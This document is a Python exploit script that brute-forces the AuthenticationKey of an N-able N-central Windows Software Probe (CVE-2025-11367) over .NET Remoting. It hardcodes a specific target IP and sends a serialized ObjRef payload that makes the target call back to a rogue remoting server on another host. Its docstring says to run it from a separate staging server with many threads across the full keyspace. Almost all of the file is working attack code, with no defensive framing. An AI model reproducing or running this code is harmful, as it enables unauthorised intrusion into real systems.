#!/usr/bin/env python3
"""
CVE-2025-11367 AuthenticationKey brute forcer
N-able N-central Windows Software Probe - port 10004/ProofOfConcept

AuthKey is a 32-bit signed int (ApplianceId) stored in ApplianceConfig.xml
Range: 1 - 2,147,483,647

Upload to cloud-health.net and run from there:
  python3 brute.py --test-rate
  python3 brute.py --start 1 --end 2147483647 --threads 50
"""

import socket, struct, base64, threading, time, argparse
from queue import Queue

TARGET  = "138.207.64.28"
PORT    = 10004
URI     = "ProofOfConcept"

# ObjRef payload - points callback to our RogueRemotingServer
PROBE_B64 = (
    "AAEAAAD/////AQAAAAAAAAAEAQAAABBTeXN0ZW0uRXhjZXB0aW9uAQAAAAlDbGFzc05hbWUDHlN5c"
    "3RlbS5SdW50aW1lLlJlbW90aW5nLk9ialJlZgkCAAAABAIAAAAeU3lzdGVtLlJ1bnRpbWUuUmVt"
    "b3RpbmcuT2JqUmVmAQAAAAN1cmwBBgMAAAAadGNwOi8vMTY3LjE3Mi4xNDIuNjk6OTk5OS8L"
)
PAYLOAD = base64.b64decode(PROBE_B64)

# SecurityException response sizes for wrong key
BAD_SIZES = {3700, 8612}

found_key  = None
found_lock = threading.Lock()
stats_lock = threading.Lock()
total_tried = 0
start_time  = time.time()


def encode_str_utf8(s):
    b = s.encode("utf-8")
    return bytes([0x01]) + struct.pack("<i", len(b)) + b


def build_frame(payload, uri, auth_key):
    headers = (
        struct.pack("<H", 6) + bytes([0x01]) + encode_str_utf8("application/octet-stream") +
        struct.pack("<H", 4) + bytes([0x01]) + encode_str_utf8(uri) +
        struct.pack("<H", 1) + encode_str_utf8("__RequestUri") + encode_str_utf8(uri) +
        struct.pack("<H", 1) + encode_str_utf8("AuthenticationKey") + encode_str_utf8(str(auth_key)) +
        struct.pack("<H", 0)
    )
    return (
        struct.pack("<I", 0x54454E2E) + bytes([0x01, 0x00]) +
        struct.pack("<H", 0) + struct.pack("<H", 0) +
        struct.pack("<i", len(payload)) + headers + payload
    )


def probe(key, timeout=4):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((TARGET, PORT))
        s.sendall(build_frame(PAYLOAD, URI, key))
        resp = b""
        try:
            while len(resp) < 16384:
                chunk = s.recv(4096)
                if not chunk:
                    break
                resp += chunk
        except socket.timeout:
            pass
        s.close()
        return len(resp), resp
    except Exception:
        return -1, b""


def extract_strings(data, min_len=5):
    result, cur = [], ""
    for b in data:
        if 32 <= b < 127:
            cur += chr(b)
        else:
            if len(cur) >= min_len:
                result.append(cur)
            cur = ""
    if len(cur) >= min_len:
        result.append(cur)
    return result


def worker(q):
    global total_tried, found_key
    while True:
        key = q.get()
        if key is None:
            q.task_done()
            break
        if found_key is not None:
            q.task_done()
            continue

        size, resp = probe(key)

        with stats_lock:
            total_tried += 1
            if total_tried % 500 == 0:
                elapsed = time.time() - start_time
                rate = total_tried / elapsed if elapsed > 0 else 0
                print(f"[*] {total_tried:,} tried | {rate:.0f} req/s | key={key:,}", flush=True)

        if size > 0 and size not in BAD_SIZES:
            strings = extract_strings(resp)
            full = " ".join(strings)
            if "SecurityException" not in full:
                with found_lock:
                    if found_key is None:
                        found_key = key
                        print(f"\n[!!!] HIT on AuthenticationKey = {key}")
                        print(f"      Response: {size} bytes")
                        print(f"      Content: {full[:400]}")
                        try:
                            with open("/tmp/dotnet-remoting/found_key.txt", "w") as f:
                                f.write(f"key={key}\nsize={size}\n{full}\n")
                        except Exception:
                            pass

        q.task_done()


def test_rate(threads):
    print(f"[*] Rate test: 1000 probes to {TARGET}:{PORT} with {threads} threads")
    q = Queue(maxsize=threads * 4)
    ts = []
    for _ in range(threads):
        t = threading.Thread(target=worker, args=(q,), daemon=True)
        t.start()
        ts.append(t)
    t0 = time.time()
    for i in range(1, 1001):
        q.put(i)
    for _ in ts:
        q.put(None)
    q.join()
    elapsed = time.time() - t0
    print(f"[+] 1000 probes in {elapsed:.1f}s = {1000/elapsed:.0f} req/s")
    total = 2_147_483_647
    eta_s = total / (1000 / elapsed)
    print(f"[+] Full keyspace ETA: {eta_s/3600:.1f} hours ({eta_s/86400:.1f} days) worst case")
    print(f"[+] Birthday (50%):   {eta_s/3600/2:.1f} hours ({eta_s/86400/2:.1f} days)")


def main():
    global TARGET, total_tried, start_time

    parser = argparse.ArgumentParser(description="CVE-2025-11367 AuthKey brute force")
    parser.add_argument("--target",     default=TARGET,         help="Target IP")
    parser.add_argument("--start",      type=int, default=1)
    parser.add_argument("--end",        type=int, default=2_147_483_647)
    parser.add_argument("--threads",    type=int, default=50)
    parser.add_argument("--test-rate",  action="store_true")
    args = parser.parse_args()

    TARGET = args.target
    start_time = time.time()

    if args.test_rate:
        test_rate(args.threads)
        return

    print(f"[*] CVE-2025-11367 AuthKey brute force")
    print(f"[*] Target: {TARGET}:{PORT}/{URI}")
    print(f"[*] Range:  {args.start:,} - {args.end:,}  ({args.end - args.start + 1:,} keys)")
    print(f"[*] Threads: {args.threads}")
    print()

    q = Queue(maxsize=args.threads * 10)
    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=worker, args=(q,), daemon=True)
        t.start()
        threads.append(t)

    try:
        for key in range(args.start, args.end + 1):
            if found_key is not None:
                break
            q.put(key)
        for _ in threads:
            q.put(None)
        q.join()
    except KeyboardInterrupt:
        print(f"\n[*] Stopped at ~{total_tried + args.start:,}")

    elapsed = time.time() - start_time
    rate = total_tried / elapsed if elapsed > 0 else 0
    print(f"\n[*] Done: {total_tried:,} keys in {elapsed:.0f}s ({rate:.0f} req/s)")
    if found_key:
        print(f"[+] FOUND: AuthenticationKey = {found_key}")
    else:
        print("[-] Not found in range")


if __name__ == "__main__":
    main()
